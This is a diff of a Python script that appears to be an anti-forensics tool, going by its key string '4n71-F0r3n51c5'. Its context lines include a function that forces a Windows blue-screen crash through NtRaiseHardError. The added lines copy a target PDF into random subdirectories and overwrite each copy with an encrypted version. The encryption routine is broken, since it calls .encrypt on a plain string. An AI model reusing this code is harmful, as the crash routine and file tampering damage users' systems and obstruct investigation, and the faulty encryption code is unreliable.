@@ -26,8 +26,10 @@ pDrive = 2
 rootDir = 'D:\documents'
 
 fileToSearch = 'Acad Calendar_SIT JDP 2022.pdf'
+fileRenamed = 'copi.pdf'
 
-newPath=Path('D:\documents')
+#newPath=Path('D:\documents')
+newPath=Path('C:\documents')
 
 ntdll = ctypes.windll.ntdll
 setShutDownPriviledge = 19
@@ -38,11 +40,27 @@ def BSOD():
     response = ctypes.c_ulong()
     res = ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(response))
 
+def encrypt(fileRenamed):
+    key = "4n71-F0r3n51c5"
+
+    # opening fileToSearch in read only mode in binary format
+    with open(fileRenamed, 'rb') as file:
+        fileB4Enc = file.read()  # file before encryption
+
+    # encrypting the file
+    encryptFile = key.encrypt(fileB4Enc)
+
+    # opening the file in write mode to write the encrypted data
+    with open(fileRenamed, 'wb') as encrypted_file:
+        encrypted_file.write(encryptFile)
+
 def fileManip(): #manipulate file by copy and to other directory
     subdirectories = [x for x in newPath.iterdir() if x.is_dir()]
+    print("\nSubdirectories: ")
     print(subdirectories)
     dstPathLen =len(subdirectories)-1
     pathSeed=random.sample(range(0,dstPathLen),int(dstPathLen/2))
+    print("\nPathseed: ")
     print(pathSeed)
     for roots, dirs, files in os.walk(rootDir):
         if(fileToSearch in files):
@@ -51,7 +69,9 @@ def fileManip(): #manipulate file by copy and to other directory
     for x in pathSeed:
         print(subdirectories[x])## to know which folder it goes
         dstPath=str(subdirectories[x])
-        shutil.copyfile(filePath,dstPath+"\copi.pdf")
+        shutil.copyfile(filePath,dstPath+"\\"+fileRenamed)
+        encrypt(dstPath+"\\"+fileRenamed)
+
 
 @dataclass
 class Drive:
